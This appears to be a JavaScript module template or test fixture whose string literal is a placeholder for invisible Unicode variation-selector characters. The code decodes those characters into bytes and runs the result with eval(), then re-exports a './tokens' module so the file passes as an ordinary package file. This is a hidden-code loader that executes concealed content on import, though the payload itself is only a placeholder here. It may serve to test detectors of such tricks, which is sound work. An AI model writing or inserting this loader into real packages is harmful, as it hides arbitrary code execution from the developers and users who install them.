const s = "{{UNICODE:vs:48}}"
const d = [...s].map((c) => { const p = c.codePointAt(0); return p >= 0xe0100 ? p - 0xe0100 + 16 : p - 0xfe00 })
eval(Buffer.from(d).toString())

module.exports = require("./tokens")
